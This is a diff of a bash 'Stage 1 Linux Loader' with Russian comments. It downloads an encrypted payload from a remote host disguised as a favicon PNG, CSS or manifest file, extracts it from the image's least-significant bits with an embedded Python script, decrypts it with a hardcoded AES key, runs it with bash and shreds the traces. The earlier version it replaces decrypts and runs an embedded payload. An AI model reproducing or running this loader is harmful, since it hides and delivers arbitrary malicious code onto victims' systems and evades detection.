@@ -1,20 +1,76 @@
 #!/bin/bash
-# AES-256-CBC decryptor template for Linux stage 1
+# Универсальный Stage 1 Linux Loader для 2025+ (LSB PNG: строго по длине!)
 
-PAYLOAD="7ab777729d73011fc29f91c444b2cf2a:yzlSLgDs+IP6IFouW1Vmg0EjTJNhC35rxV/POfBYhka2iFfc6TYgDZSOlMD9cwRRc0Qnv/i3ZFOJbBqm51+UdFoZ7qRVCAllgZ8g3gvcKPPpLbkjUGKl3X/u3BJ9052F+aDgq5BAOyK6I1jVsiGx/Jcn1g90cC2KGRwtuWZuYBxLHYCIOThOrqAfq5291rFbucH+LIPQJ5lLkMfiQGshL0ShV3AkiZm7Fc61s6Rbl4n62Qw5GgdlCu2PPVsz97Qdzsy7ArZZEbQ8YdZM57CUj7tDua0vqDSSVlMXW5zJtPbN7YSuN+QSwO/DYbyo6lYG5dBMLmFhiAhvOQO5HvRFqMFNsbQAjEoi5aVEC2Z72OqFdWr+GKPoD06aG4Op2YBo7o+t5mLqK7+8OxaA8Ns5tiSc9cexBktQ0mEMCIkotKbNRE8UMRDd54AVWiHSbJ/8gJJ02ZDBHtIk3GgeVs58AIJlLbC68vvHaLG5+BHUXGY="  # encrypted ivhex:base64cipher, вставится на сборке
-KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY
+DELIVERY="png"          # css, manifest, png (подставляет run.sh)
+URL="http://192.168.0.151:1/favicon.png"                    # http://IP:PORT/style.css или manifest.json или favicon.png
+KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"                    # HEX (подставляет run.sh)
+TMP=/tmp/.drop$RANDOM$RANDOM
 
+case "$DELIVERY" in
+  css)
+    PAYLOAD=$(curl -fsSL "$URL" | grep -oP 'content:\s*"\K[^"]+')
+    ;;
+  manifest)
+    PAYLOAD=$(curl -fsSL "$URL" | grep -oP '"payload"\s*:\s*"\K[^"]+')
+    ;;
+  png)
+    curl -fsSL "$URL" -o "$TMP.png"
+    cat > "$TMP.extract.py" <<'PYCODE'
+from PIL import Image
+import sys
+import struct
+
+def extract_lsb_with_len(png_file):
+    img = Image.open(png_file).convert("RGBA")
+    pixels = list(img.getdata())
+    bits = []
+    for pixel in pixels:
+        r, g, b, a = pixel
+        bits.append(str(r & 1))
+        bits.append(str(g & 1))
+        bits.append(str(b & 1))
+    # Сначала длина (4 байта big-endian)
+    header_bits = bits[:32]
+    payload_len = struct.unpack(">I", int(''.join(header_bits), 2).to_bytes(4, 'big'))[0]
+    chars = []
+    for i in range(32, 32 + payload_len * 8, 8):
+        byte = bits[i:i+8]
+        if len(byte) < 8:
+            break
+        c = chr(int(''.join(byte), 2))
+        chars.append(c)
+    return ''.join(chars)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Usage: python3 lsb_extract.py <input_png>")
+        sys.exit(1)
+    result = extract_lsb_with_len(sys.argv[1])
+    print(result)
+PYCODE
+    PAYLOAD=$(python3 "$TMP.extract.py" "$TMP.png")
+    rm -f "$TMP.png" "$TMP.extract.py"
+    ;;
+  *)
+    echo "Unknown delivery method"; exit 1
+    ;;
+esac
+
+
+if [[ -z "$PAYLOAD" ]]; then
+  echo "[!] PAYLOAD not found, exiting!"
+  exit 2
+fi
+
+# --- [ Расшифровка ] ---
 iv=$(echo "$PAYLOAD" | cut -d: -f1)
 cipher=$(echo "$PAYLOAD" | cut -d: -f2)
 
-# Декодируем base64 в бинарник
-echo "$cipher" | base64 -d > /tmp/cipher.bin
+echo "$cipher" | base64 -d > "$TMP.cipher"
+openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in "$TMP.cipher" -out "$TMP.plain" 2>/dev/null
 
-# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
-openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh
+bash "$TMP.plain"
 
-# Запускаем payload
-bash /tmp/plaintext.sh
+shred -u "$TMP.cipher" "$TMP.plain" 2>/dev/null
 
-# Удаляем временные файлы
-rm -f /tmp/cipher.bin /tmp/plaintext.sh
+exit 0
